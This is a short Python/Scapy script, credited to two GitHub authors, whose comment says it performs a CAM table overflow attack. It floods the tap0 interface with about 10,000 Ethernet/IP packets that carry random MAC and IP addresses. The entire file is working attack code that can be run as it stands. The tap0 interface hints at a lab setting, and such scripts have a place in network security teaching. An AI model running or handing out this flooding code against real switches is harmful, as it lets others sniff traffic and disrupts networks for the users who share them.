# Bharath(github.com/yamakira)
# Matt Kijowski(github.com/mkijowski)

# Perform CAM overflow attack on tap0 interface


#!/usr/bin/env python
from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp

# initializing packet_list to hold all the packets
packet_list  = []

# generate a bunch of random mac addresses and IP addresses
for i in xrange(1,10000):
   packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
   packet_list.append(packet)


# send our bad packets on tap0
sendp(packet_list, iface='tap0')
